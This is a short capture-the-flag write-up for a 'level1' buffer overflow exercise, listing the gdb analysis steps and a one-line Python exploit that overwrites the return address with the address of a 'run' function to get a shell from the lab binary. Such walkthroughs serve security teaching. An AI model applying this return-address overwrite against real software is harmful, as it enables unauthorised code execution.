## level1 - Buffer Overflow
---

### Steps to solve
- #### use gdb to get the disassemble main function
- #### analyse the instructions searsh about call functions or operations
- #### the program crash if buffer overflow specialy when give more than 75 byte
- #### detect the vulnrability type, which is buffer overflow in this case we can override the stack
---
## Solution
- #### Run the programm with a input contain 76 chars and the address of the `run` function `0x08048444` in little endain `\x44\x84\x04\x08`
    ```sh
        (python -c 'print("a"*(64+12)+"\x44\x84\x04\x08")'; cat) | ./level1 
    ```















